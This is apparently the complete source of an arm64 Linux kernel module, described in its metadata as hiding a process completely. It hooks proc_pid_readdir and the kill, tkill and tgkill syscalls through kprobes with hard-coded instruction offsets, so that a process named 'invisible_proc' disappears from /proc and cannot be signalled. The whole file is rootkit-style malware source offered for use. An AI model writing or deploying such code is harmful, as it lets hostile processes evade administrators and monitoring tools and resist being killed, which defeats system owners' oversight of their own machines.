#include <linux/errno.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/sched.h>

#define PROCESS_NAME "invisible_proc"

#define __pr_info(fmt, ...)                                                    \
  printk(KERN_INFO "[%s:%d] %s(): " fmt "\n", __FILE__, __LINE__, __func__,    \
         ##__VA_ARGS__)

#define __pr_debug(fmt, ...)                                                   \
  printk(KERN_DEBUG "[%s:%d] %s(): " fmt "\n", __FILE__, __LINE__, __func__,   \
         ##__VA_ARGS__)

pid_t find_pid_by_name(const char *process_name);

pid_t find_pid_by_name(const char *process_name) {
  struct task_struct *task = NULL;

  for_each_process(task) {
    if (strcmp(task->comm, process_name) == 0) {
      return task->pid;
    }
  }

  return -1;
}

struct tgid_iter {
  unsigned int tgid;
  struct task_struct *task;
};

static int proc_pid_readdir_pre_handler(struct kprobe *p,
                                        struct pt_regs *regs) {
  pid_t proc_pid = regs->regs[3];
  pid_t target_pid = find_pid_by_name(PROCESS_NAME);
  if (proc_pid == target_pid) {
    regs->pc = (unsigned long)p->addr - 0x58;
    return 1;
  }
  return 0;
}

static int __arm64_sys_tgkill_pre_handler(struct kprobe *p,
                                          struct pt_regs *regs) {
  pid_t target_pid = find_pid_by_name(PROCESS_NAME);

  if (regs->regs[0] == target_pid || regs->regs[1] == target_pid) {
    regs->regs[0] = 0xfffffffffffffffd; // -3
    regs->pc = (unsigned long)p->addr + 0xac;
    return 1;
  }

  return 0;
}

static int __arm64_sys_tkill_pre_handler(struct kprobe *p,
                                         struct pt_regs *regs) {
  pid_t target_pid = find_pid_by_name(PROCESS_NAME);

  if (regs->regs[0] == target_pid) {
    regs->regs[0] = 0xfffffffffffffffd; // -3
    regs->pc = (unsigned long)p->addr + 0xa4;
    return 1;
  }

  return 0;
}

static int __arm64_sys_kill_pre_handler(struct kprobe *p,
                                        struct pt_regs *regs) {
  pid_t target_pid = find_pid_by_name(PROCESS_NAME);

  if (regs->regs[19] == target_pid) {
    regs->pc = (unsigned long)p->addr + 0x15C;
    return 1;
  }

  return 0;
}

static struct kprobe kp1 = {.symbol_name = "proc_pid_readdir",
                            .offset = 0x134,
                            .pre_handler = proc_pid_readdir_pre_handler};

static struct kprobe kp2 = {.symbol_name = "__arm64_sys_tgkill",
                            .offset = 0x00,
                            .pre_handler = __arm64_sys_tgkill_pre_handler};

static struct kprobe kp3 = {.symbol_name = "__arm64_sys_tkill",
                            .offset = 0x00,
                            .pre_handler = __arm64_sys_tkill_pre_handler};

static struct kprobe kp4 = {.symbol_name = "__arm64_sys_kill",
                            .offset = 0x54,
                            .pre_handler = __arm64_sys_kill_pre_handler};

static struct kprobe *kprobe_handlers[] = {
    &kp1,
    &kp2,
    &kp3,
    &kp4,
};

static int __init vm_init(void) {
  int ret;
  ret = register_kprobes(kprobe_handlers, ARRAY_SIZE(kprobe_handlers));
  if (ret < 0) {
    __pr_info("Failed to register kprobes %d", ret);
    return ret;
  }

  return 0;
}

static void __exit vm_exit(void) {
  unregister_kprobes(kprobe_handlers, ARRAY_SIZE(kprobe_handlers));
}

module_init(vm_init);
module_exit(vm_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("EmbeddedOS");
MODULE_DESCRIPTION("Kernel module to hide a process completely");
